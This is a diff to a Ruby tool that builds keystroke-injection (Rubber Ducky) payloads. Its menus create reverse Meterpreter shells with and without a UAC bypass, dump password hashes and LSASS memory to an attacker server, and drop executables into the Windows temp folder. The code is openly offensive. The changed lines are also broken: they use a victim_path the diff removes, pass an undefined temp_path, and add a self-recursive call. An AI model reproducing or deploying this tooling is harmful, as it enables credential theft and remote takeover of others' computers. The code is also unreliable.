@@ -40,19 +40,19 @@ def server(attack)
   end
 end
 def hex_setup
-  victim_path = 'c:\\windows\\temp\\'
   file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
   file_name = file_path.split('/')[-1]
+  hex_setup if not File.exists?(file_name)
   hex_string = bin_to_hex(file_path)
   random_name_answer = [(get_input('Would you like to randomize the file name?[yes/no] ') ), $stdin.gets.rstrip][1]
   if random_name_answer == 'yes'
     print_info("Creating Random Name!\n")
     random_name = random_name_gen
-    powershell_command = powershell_hex_to_bin(hex_string,"#{victim_path}#{random_name}")
+    powershell_command = powershell_hex_to_bin(temp_path,"#{victim_path}#{random_name}")
   else
-    powershell_command = powershell_hex_to_bin(hex_string,"#{victim_path}#{file_name}")
+    powershell_command = powershell_hex_to_bin(temp_path,"#{victim_path}#{file_name}")
   end
-  return powershell_command
+  return powershell_command,hex_string
 end
 def meterpreter_setup     
   server_setup = ServerSetUp.new
@@ -102,21 +102,18 @@ def case_reverse_meterpreter_menu
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_meterpreter_uac(encode_command(powershell_command))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
     when '2'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_meterpreter_no_uac(encode_command(powershell_command))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
 	  when '3'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_meterpreter_low(encode_command(powershell_command))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
     when '99'
@@ -135,14 +132,12 @@ def case_dump_hashes_menu
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_hash_dump_uac(encode_command(powershell_command))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(hash_dump_file)
       start_hash_server(port)
     when '2'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       ducky_hash_dump_no_uac(encode_command(powershell_command))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(hash_dump_file)
       start_hash_server(port)
     when '99'
@@ -161,14 +156,12 @@ def case_dump_lsass_menu
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       ducky_lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(lsass_dump_file)
       start_lsass_server(port)
     when '2'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       ducky_lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
-      print_info("Compiling Text to Bin!\n")
       compile_ducky(lsass_dump_file)
       start_lsass_server(port)
     when '99'
@@ -211,19 +204,19 @@ def case_hex_to_bin_menu
   hex_answer = hex_to_bin_menu
   case hex_answer
     when '1'
-      powershell_command = hex_setup
+      powershell_command,hex_string = hex_setup
       print_info("Creating Text File!\n")
-      ducky_hex_uac(encode_command(powershell_command))
+      ducky_hex_uac(hex_string,encode_command(powershell_command))
       compile_ducky(hex_to_bin_file)
     when '2'
-      powershell_command = hex_setup
+      powershell_command,hex_string = hex_setup
       print_info("Creating Text File!\n")
-      ducky_hex_no_uac(encode_command(powershell_command))
+      ducky_hex_no_uac(hex_string,encode_command(powershell_command))
       compile_ducky(hex_to_bin_file)
     when '3'
-      powershell_command = hex_setup
+      powershell_command,hex_string = hex_setup
       print_info("Creating Text File!\n")
-      ducky_hex_low(encode_command(powershell_command))
+      ducky_hex_low(hex_string,encode_command(powershell_command))
       compile_ducky(hex_to_bin_file)
     when '99'
       case_main_menu
